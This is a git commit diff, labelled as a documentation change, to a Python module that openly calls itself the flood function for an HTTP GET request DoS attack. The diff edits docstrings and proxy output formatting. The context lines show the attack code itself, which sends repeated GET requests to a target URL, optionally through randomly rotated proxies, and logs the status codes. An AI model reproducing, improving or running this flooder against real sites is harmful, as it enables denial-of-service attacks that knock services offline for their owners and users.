7aea8b27d9e8210ecb1afba778be1f70d5e97af0
João Vitor <joaovitorsouza205@hotmail.com>
2022-10-24 22:27:47 -0300

    docs: some documentation

--- tools/L7/http.py
+++ tools/L7/http.py
@@ -1,4 +1,4 @@
-"""This module provides the flood function for a HTTP GET request DoS attack."""
+"""This module provides the flood function for an HTTP GET request DoS attack."""
 
 import json
 import random
@@ -36,23 +36,25 @@ color_code = {True: Fore.GREEN, False: Fore.RED}
 def flood(target: str, use_proxy: bool) -> None:
     """Start the HTTP GET request flood.
 
-    Keyword arguments:
-    target -- target's URL
-    use_proxy -- whether or not to use proxy
+    Args:
+        - target - Target's URL
+        - use_proxy - Whether or not to use proxy
+
+    Returns:
+        None
     """
     try:
         if use_proxy:
             proxy = random.choice(proxies_)
             r = requests.get(target, headers=headers, proxies=proxy, timeout=4)
         else:
-            proxy = {"http": "NO PROXY"}
             r = requests.get(target, headers=headers, timeout=4)
     except:
         pass
     else:
         status = f"{color_code[r.status_code == 200]}Status: [{r.status_code}]"
         payload_size = f"{Fore.CYAN} Requested Data Size: {len(r.content)/1000:>10} KB"
-        proxy_addr = f"{Fore.CYAN}Proxy: {proxy['http']:>21}"
+        proxy_addr = f"| {Fore.CYAN}Proxy: {proxy['http']:>21}" if use_proxy else ""
         print(
-            f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}| {proxy_addr}{Fore.RESET}"
+            f"{status}{Fore.RESET} --> {payload_size} {Fore.RESET}{proxy_addr}{Fore.RESET}"
         )
